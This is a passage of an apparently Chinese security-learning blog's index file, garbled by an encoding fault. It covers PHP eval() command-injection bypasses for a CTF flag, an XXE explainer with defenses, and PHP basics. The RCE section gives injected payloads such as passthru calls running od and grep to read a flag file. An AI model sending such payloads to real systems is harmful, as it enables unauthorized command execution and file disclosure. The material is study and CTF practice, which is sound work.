&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å†æ¥é»‘æˆ‘ä¸«ï¼ï¼ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•æ€»ç»“</p><h5 id="1-tacåå‘æ˜¾ç¤º"><a href="#1-tacåå‘æ˜¾ç¤º" class="headerlink" title="1.tacåå‘æ˜¾ç¤º"></a>1.tacåå‘æ˜¾ç¤º</h5><blockquote><p>æœ¬æ¥æ˜¯ä»ç¬¬ä¸€è¡Œæ˜¾ç¤ºï¼Œç”¨äº† <code>tac</code>ä¹‹åå°±æ˜¯ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾</p><p>ç¤ºä¸€ç›´åˆ°ç¬¬ä¸€è¡Œã€‚</p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819154508054.png" alt="image-20230819154508054"></p><h5 id="2-moreä¸lessï¼ˆä¸€é¡µä¸€é¡µçš„å›æ˜¾å†…å®¹ï¼‰"><a href="#2-moreä¸lessï¼ˆä¸€é¡µä¸€é¡µçš„å›æ˜¾å†…å®¹ï¼‰" class="headerlink" title="2.moreä¸lessï¼ˆä¸€é¡µä¸€é¡µçš„å›æ˜¾å†…å®¹ï¼‰"></a>2.moreä¸lessï¼ˆä¸€é¡µä¸€é¡µçš„å›æ˜¾å†…å®¹ï¼‰</h5><blockquote><p>ä¸€é¡µä¸€é¡µçš„å¸®æˆ‘ä»¬æ˜¾ç¤ºå†…å®¹ åœ¨linuxä¸­æˆ‘ä»¬ç”¨moreè¯»å–æ–‡ä»¶</p><p>æ—¶ï¼Œå®ƒä¼šå…ˆæ˜¾ç¤ºä¸€é¡µï¼Œç„¶åæˆ‘ä»¬æ•²ä¸ªå›è½¦å®ƒå°±ä¼šæ˜¾ç¤ºä¸‹ä¸€é¢</p><p>æˆ‘ä»¬åšé¢˜çš„æ—¶å€™flagæ–‡ä»¶å†…å®¹æœ¬æ¥å°±å°‘ï¼Œä½¿å¾—moreå…¶å®è·Ÿ</p><p>catçš„ä½œç”¨æ˜¯ä¸€æ ·çš„,å½“ç„¶lessä¹Ÿæ˜¯</p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819155404387.png" alt="image-20230819155404387"></p><p>moreæ˜¯é¡µé¢æ²¡æœ‰æ˜¾ç¤ºå®Œï¼Œå¯ä»¥æŒ‰ç…§é¡µé¢ç™¾åˆ†ç™¾æ‰“å°å‡ºæ¥å†…å®¹ï¼Œéšé¡µé¢å¤§å°å˜åŒ–ã€‚</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819155449121.png" alt="image-20230819155449121"></p><p>lessæ˜¯å¼€å§‹é¡µé¢æ²¡æœ‰æ˜¾ç¤ºå®Œï¼Œä¼šé€è¡Œæ‰“å°ã€‚</p><h5 id="3-tailï¼ˆè¾“å‡ºæ–‡ä»¶æœ«å°¾çš„10è¡Œå†…å®¹ï¼‰"><a href="#3-tailï¼ˆè¾“å‡ºæ–‡ä»¶æœ«å°¾çš„10è¡Œå†…å®¹ï¼‰" class="headerlink" title="3.tailï¼ˆè¾“å‡ºæ–‡ä»¶æœ«å°¾çš„10è¡Œå†…å®¹ï¼‰"></a>3.tailï¼ˆè¾“å‡ºæ–‡ä»¶æœ«å°¾çš„10è¡Œå†…å®¹ï¼‰</h5><p>æŸ¥çœ‹æœ«å°¾çš„10è¡Œï¼Œé™¤å»è¿™ä¸ªï¼Œä¸catç›¸åŒ</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819160446462.png" alt="image-20230819160446462"></p><h5 id="4-headï¼ˆè¾“å‡ºæ–‡ä»¶å‰åè¡Œå†…å®¹ï¼‰"><a href="#4-headï¼ˆè¾“å‡ºæ–‡ä»¶å‰åè¡Œå†…å®¹ï¼‰" class="headerlink" title="4.headï¼ˆè¾“å‡ºæ–‡ä»¶å‰åè¡Œå†…å®¹ï¼‰"></a>4.headï¼ˆè¾“å‡ºæ–‡ä»¶å‰åè¡Œå†…å®¹ï¼‰</h5><p>æŸ¥çœ‹å‰é¢çš„10è¡Œï¼Œé™¤å»è¿™ä¸ªï¼Œä¸catç›¸åŒ</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819160658613.png" alt="image-20230819160658613"></p><h5 id="5-nlï¼ˆcatä½œç”¨ç›¸åŒï¼Œè€Œä¸”èƒ½å¤Ÿé¡ºä¾¿è¾“å‡ºè¡Œå·ï¼‰"><a href="#5-nlï¼ˆcatä½œç”¨ç›¸åŒï¼Œè€Œä¸”èƒ½å¤Ÿé¡ºä¾¿è¾“å‡ºè¡Œå·ï¼‰" class="headerlink" title="5.nlï¼ˆcatä½œç”¨ç›¸åŒï¼Œè€Œä¸”èƒ½å¤Ÿé¡ºä¾¿è¾“å‡ºè¡Œå·ï¼‰"></a>5.nlï¼ˆcatä½œç”¨ç›¸åŒï¼Œè€Œä¸”èƒ½å¤Ÿé¡ºä¾¿è¾“å‡ºè¡Œå·ï¼‰</h5><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819161111439.png" alt="image-20230819161111439"></p><h5 id="6-odä¸xxd-æŸ¥çœ‹æ–‡ä»¶äºŒè¿›åˆ¶å½¢å¼ï¼‰"><a href="#6-odä¸xxd-æŸ¥çœ‹æ–‡ä»¶äºŒè¿›åˆ¶å½¢å¼ï¼‰" class="headerlink" title="6.odä¸xxd(æŸ¥çœ‹æ–‡ä»¶äºŒè¿›åˆ¶å½¢å¼ï¼‰"></a>6.odä¸xxd(æŸ¥çœ‹æ–‡ä»¶äºŒè¿›åˆ¶å½¢å¼ï¼‰</h5><p>ä»¥äºŒè¿›åˆ¶å½¢å¼æŸ¥çœ‹æºä»£ç ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥åŠ å‡ ä¸ªå‚æ•°ï¼Œè½¬åŒ–ä¸€ä¸‹ï¼Œ</p><p>èƒ½å¤Ÿçœ‹åˆ°assicç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&quot;od -A d -c flag&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819164230121.png" alt="image-20230819164230121"></p><h5 id="7-sortï¼ˆå°†å†…å®¹æ’åºåè¾“å‡ºå‡ºæ¥ï¼‰"><a href="#7-sortï¼ˆå°†å†…å®¹æ’åºåè¾“å‡ºå‡ºæ¥ï¼‰" class="headerlink" title="7.sortï¼ˆå°†å†…å®¹æ’åºåè¾“å‡ºå‡ºæ¥ï¼‰"></a>7.sortï¼ˆå°†å†…å®¹æ’åºåè¾“å‡ºå‡ºæ¥ï¼‰</h5><p>å°†å†…å®¹æ’åºåè¾“å‡ºå‡ºæ¥ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</p><p>é»˜è®¤æ‰“å°é¡ºåºæ˜¯å€’åºï¼Œ-Ræ˜¯éšæœºæ’åº</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819165043752.png" alt="image-20230819165043752"></p><h5 id="8-file-f-å°†æŠ¥é”™ä¿¡æ¯å›æ˜¾åˆ°ç•Œé¢ä¸Š"><a href="#8-file-f-å°†æŠ¥é”™ä¿¡æ¯å›æ˜¾åˆ°ç•Œé¢ä¸Š" class="headerlink" title="8.file -f(å°†æŠ¥é”™ä¿¡æ¯å›æ˜¾åˆ°ç•Œé¢ä¸Š)"></a>8.file -f(å°†æŠ¥é”™ä¿¡æ¯å›æ˜¾åˆ°ç•Œé¢ä¸Š)</h5><p>æ„æ€æ˜¯å°†æŠ¥é”™çš„ä¿¡æ¯å›æ˜¾åˆ°ç•Œé¢ä¸Š</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819165812042.png" alt="image-20230819165812042"></p><h5 id="9-grepï¼ˆåœ¨æŒ‡å®šæ–‡æœ¬ä¸­æœç´¢æŒ‡å®šå­—ç¬¦ä¸²ï¼‰"><a href="#9-grepï¼ˆåœ¨æŒ‡å®šæ–‡æœ¬ä¸­æœç´¢æŒ‡å®šå­—ç¬¦ä¸²ï¼‰" class="headerlink" title="9.grepï¼ˆåœ¨æŒ‡å®šæ–‡æœ¬ä¸­æœç´¢æŒ‡å®šå­—ç¬¦ä¸²ï¼‰"></a>9.grepï¼ˆåœ¨æŒ‡å®šæ–‡æœ¬ä¸­æœç´¢æŒ‡å®šå­—ç¬¦ä¸²ï¼‰</h5><p>åœ¨æ–‡æœ¬ä¸­æœç´¢æŒ‡å®šå­—ç¬¦ä¸²ï¼Œå¹¶å°†å†…å®¹è¾“å‡ºå‡ºæ¥</p><p>*è¡¨ç¤ºæœç´¢å½“å‰ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&quot;grep flag *&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819170304882.png" alt="image-20230819170304882"></p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819170519481.png" alt="image-20230819170519481"></p><h4 id="6-é•¿åº¦è¿‡æ»¤"><a href="#6-é•¿åº¦è¿‡æ»¤" class="headerlink" title="6.é•¿åº¦è¿‡æ»¤"></a>6.é•¿åº¦è¿‡æ»¤</h4><p>1.å‰ç½®çŸ¥è¯†</p><p>(1)&gt;ä¸&gt;&gt;</p>]]></content>
      
      
      <categories>
          
          <category> å‘½ä»¤å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe</title>
      <link href="/2023/08/08/xxe/"/>
      <url>/2023/08/08/xxe/</url>
      
        <content type="html"><![CDATA[<h2 id="xxeæ¼æ´åŸç†ä»¥åŠåˆ©ç”¨"><a href="#xxeæ¼æ´åŸç†ä»¥åŠåˆ©ç”¨" class="headerlink" title="xxeæ¼æ´åŸç†ä»¥åŠåˆ©ç”¨"></a>xxeæ¼æ´åŸç†ä»¥åŠåˆ©ç”¨</h2><p>xxeæ¼æ´å…¨ç§°<code>XML External Entity Injection</code>,ä¹Ÿå°±æ˜¯xmlå¤–éƒ¨å®ä½“æ³¨</p><p>å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ </p><p>è½½ï¼Œå¯¼è‡´<code>å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€</code></p><p><code>æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³</code>ã€‚XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥<code>ä¸Šä¼ </code></p><p><code>XMLæ–‡ä»¶</code>çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„XMLæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„XMLæ–‡</p><p>ä»¶ã€‚</p><h2 id="å¸¸è§çš„xxeæ¼æ´ç±»å‹"><a href="#å¸¸è§çš„xxeæ¼æ´ç±»å‹" class="headerlink" title="å¸¸è§çš„xxeæ¼æ´ç±»å‹"></a>å¸¸è§çš„xxeæ¼æ´ç±»å‹</h2><blockquote><ul><li>å…¸å‹æ³¨å…¥ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤–éƒ¨å®ä½“åŒ…å«åœ¨æœ¬åœ° DTD ä¸­</li><li>ç›²æ³¨ï¼šå“åº”ä¸­æ²¡æœ‰æ˜¾ç¤ºè¾“å‡ºå’Œ/æˆ–é”™è¯¯</li><li>æŠ¥é”™æ³¨å…¥ï¼šå°è¯•åœ¨é”™è¯¯æ¶ˆæ¯ä¸­è·å–èµ„æºçš„å†…å®¹</li></ul></blockquote><h2 id="XMLåŸºç¡€çŸ¥è¯†"><a href="#XMLåŸºç¡€çŸ¥è¯†" class="headerlink" title="XMLåŸºç¡€çŸ¥è¯†"></a>XMLåŸºç¡€çŸ¥è¯†</h2><p>XMLæŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ã€‚</p><p>XMLè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚</p><p>XMLè¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ï¼Œå…è®¸ä½œè€…å®šä¹‰è‡ªå·±çš„æ ‡ç­¾å’Œè‡ªå·±çš„æ–‡æ¡£ç»“æ„ã€‚</p><p>è¯­æ³•è§„åˆ™ï¼š</p><blockquote><p>XMLæ–‡æ¡£å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ <br>XMLå…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾<br>XMLæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ<br>XMLå…ƒç´ å¿…é¡»è¢«æ­£ç¡®çš„åµŒå¥—<br>XMLå±æ€§å¿…é¡»åŠ å¼•å¯¼</p></blockquote><p>ä¾‹å¦‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>m0re<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you know xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®æ¥æ£€æŸ¥ä¸€ä¸‹ä¸Šé¢çš„è§„åˆ™ã€‚æ¯”å¦‚æ ‡ç­¾çš„å­—æ¯å¤§å°å†™ä¿®æ”¹ä¸€</p><p>ä¸‹è¿˜èƒ½ä¸èƒ½å’Œè§£ææˆåŠŸã€‚</p><h3 id="å®ä½“å¼•ç”¨"><a href="#å®ä½“å¼•ç”¨" class="headerlink" title="å®ä½“å¼•ç”¨"></a>å®ä½“å¼•ç”¨</h3><p><img src="/2023/08/08/xxe/image-20230809162744204.png" alt="image-20230809162744204"></p><p>å®ä½“å¼•ç”¨æ˜¯å› ä¸ºåœ¨æµè§ˆå™¨ä¸­ç›´æ¥ä½¿ç”¨è¿™å‡ ä¸ªç¬¦å·å¯èƒ½æ— æ³•æˆåŠŸæ‰“å°å‡ºæ¥ï¼Œå¯èƒ½ä¼šæœ‰æ­§ä¹‰ï¼Œæ‰€ä»¥å°±éœ€è¦å®ä½“å¼•ç”¨èµ·ä½œç”¨äº†ã€‚</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTDçš„ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚</p><p>DTDå¯ä»¥åœ¨XMLæ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p><p>DTDçš„å±æ€§å¦‚ä¸‹ï¼š</p><p><img src="/2023/08/08/xxe/image-20230809211937863.png" alt="image-20230809211937863"></p><p>ç¤ºä¾‹ï¼š</p><p>1.å†…éƒ¨å£°æ˜ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encode=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">note</span>[</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>.<span class="keyword">heading</span>, <span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>     (<span class="keyword">#PCATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>   (<span class="keyword">#PCATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">      <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span>(<span class="keyword">#PCATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>   (<span class="keyword">#PCATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">to</span>&gt;</span>more<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you kown xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line">      </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.å¤–éƒ¨å¼•ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encode=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>more<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you kown xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- note.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>.<span class="keyword">heading</span>, <span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span>     (<span class="keyword">#PCATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span>   (<span class="keyword">#PCATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span>(<span class="keyword">#PCATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span>   (<span class="keyword">#PCATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><p>é»˜è®¤å±æ€§å€¼ï¼š</p><p>é»˜è®¤å±æ€§å€¼å¯ä½¿ç”¨ä¸‹åˆ—å€¼</p><blockquote><p>å€¼               è§£é‡Š</p><p>å€¼               å±æ€§çš„é»˜è®¤å€¼</p><p>#REQUIRED        å±æ€§å€¼æ˜¯å¿…éœ€çš„</p><p>#IMPLIED         å±æ€§ä¸æ˜¯å¿…éœ€çš„</p><p>#FIXED value     å±æ€§å€¼æ˜¯å›ºå®šçš„</p></blockquote><p>ä¸¤ç§æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œå…¶å®ä¸åŠ <code>&lt;!ELEMENT note </code></p><p><code>(to,from.heading,body)&gt;</code>è¿™ä¸ªä¹Ÿæ˜¯å¯ä»¥æ˜¾ç¤ºå‡ºæ¥ç›¸åŒçš„å†…å®¹ï¼Œè¿™é‡Œçš„</p><p>ä¾‹å­çŸ¥è¯†ä¸ºäº†è¯´æ˜è¿™ä¸¤ç§å¼•</p><p>ç”¨æ–¹å¼ä¸€æ ·ã€‚</p><p>è¿™ä¸ªæ˜¯æœ¬åœ°çš„ï¼Œä½†æ˜¯å¦‚æœæ˜¯å…è®¸webå¼•ç”¨åŒ…å«çš„è¯ï¼Œå±å®³å°±æ¯”è¾ƒå¤§äº†ã€‚</p><blockquote><p>å¤–éƒ¨å£°æ˜é»˜è®¤åè®®åŠPHPæ‰©å±•åè®®</p><p>libxml2   php                  Java          .NET</p><p>file      file                http            file</p><p>http      http                https           http</p><p>ftp       ftp                 ftp             https</p><p>â€‹          php                 file            ftp</p><p>â€‹          compress.zlib       jar</p><p>â€‹          compress.bzip2      netdoc</p><p>â€‹          data                mailto</p><p>â€‹          glob                gopher  *</p><p>â€‹          phar</p></blockquote><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><blockquote><p>1.ç¦æ­¢ä½¿ç”¨<strong>å¤–éƒ¨å®ä½“</strong>ï¼Œä¾‹å¦‚ï¼š</p><p>PHPï¼šlibxml_disable_entity_loader(true)</p><p>2.è¿‡æ»¤ç”¨æˆ·æäº¤çš„xmlæ•°æ®ï¼Œé˜²æ­¢å‡ºç°éæ³•å†…å®¹ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpå­¦ä¹ </title>
      <link href="/2023/08/05/php%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/05/php%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="phpåŸºæœ¬çŸ¥è¯†"><a href="#phpåŸºæœ¬çŸ¥è¯†" class="headerlink" title="phpåŸºæœ¬çŸ¥è¯†"></a>phpåŸºæœ¬çŸ¥è¯†</h1><p>1.php(å…¨ç§°:PHP:Hypertext Preprocessor,å³â€œPHP:è¶…æ–‡æœ¬é¢„å¤„ç†å™¨â€)æ˜¯ä¸€ç§é€šç”¨å¼€æºè„šæœ¬è¯­è¨€ã€‚</p><p>2.phpè„šæœ¬å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚</p><h1 id="PHPè¯­æ³•"><a href="#PHPè¯­æ³•" class="headerlink" title="PHPè¯­æ³•"></a>PHPè¯­æ³•</h1><p>1.phpè„šæœ¬å¯ä»¥æ”¾åœ¨æ–‡æ¡£ä¸­çš„ä»»ä½•ä½ç½®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//PHP ä»£ç </span></span><br><span class="line"><span class="comment">//è¿™æ˜¯PHPå•è¡Œæ³¨é‡Š</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> è¿™æ˜¯phpå¤šè¡Œæ³¨é‡Š</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="PHPå˜é‡"><a href="#PHPå˜é‡" class="headerlink" title="PHPå˜é‡"></a>PHPå˜é‡</h1><p>1.å˜é‡æ˜¯ç”¨äºå­˜å‚¨ä¿¡æ¯çš„â€œå®¹å™¨â€:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line">  <span class="variable">$y</span>=<span class="number">6</span>;</span><br><span class="line">  <span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="/2023/08/05/php%E5%AD%A6%E4%B9%A0/image-20230829203317605.png" alt="image-20230829203317605"></p><p>ä¸ä»£æ•°ç±»ä¼¼ï¼Œx=5ï¼Œy=6ï¼Œz=x+yï¼Œåœ¨ä½¿ç”¨å­—æ¯(å¦‚x)ï¼Œå¹¶ç»™å®ƒèµ‹å€¼(å¦‚5)ã€‚ä¸Šé¢çš„è¡¨è¾¾å¼z=x+yï¼Œå¯ä»¥è®¡ç®—å‡ºzçš„å€¼ä¸º11ã€‚</p><blockquote><p><strong>åœ¨phpä¸­ï¼Œè¿™äº›å­—æ¯è¢«ç§°ä¸ºå˜é‡ã€‚</strong></p><p><strong>å˜é‡æ˜¯ç”¨äºå­˜å‚¨æ•°æ®çš„å®¹å™¨ã€‚</strong></p></blockquote><blockquote><p>phpå˜é‡è§„åˆ™ï¼š</p><p>1.å˜é‡ä»¥$ç¬¦å·å¼€å§‹ï¼Œåé¢è·Ÿç€å˜é‡çš„åç§°ã€‚</p><p>2.å˜é‡åå¿…é¡»ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å­—ç¬¦å¼€å§‹ã€‚</p><p>3.å˜é‡ååªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—ä»¥åŠä¸‹åˆ’çº¿(A-zã€0-9å’Œ_)ã€‚</p><p>4.å˜é‡åä¸èƒ½åŒ…å«ç©ºæ ¼ã€‚</p><p>5.å˜é‡åæ˜¯åŒºåˆ†å¤§å°å†™çš„(<code>$X</code>å’Œ<code>$x</code>æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡)ã€‚</p><p><strong>PHP è¯­å¥å’Œ PHP å˜é‡éƒ½æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚</strong></p></blockquote><h2 id="åˆ›å»º-å£°æ˜-phpå˜é‡"><a href="#åˆ›å»º-å£°æ˜-phpå˜é‡" class="headerlink" title="åˆ›å»º(å£°æ˜)phpå˜é‡"></a>åˆ›å»º(å£°æ˜)phpå˜é‡</h2><p>phpæ²¡æœ‰å£°æ˜å˜é‡çš„å‘½ä»¤ï¼Œå˜é‡åœ¨ç¬¬ä¸€æ¬¡èµ‹å€¼ç»™å®ƒçš„æ—¶å€™è¢«åˆ›å»º</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$txt</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">  <span class="variable">$x</span>=<span class="number">5</span>;</span><br><span 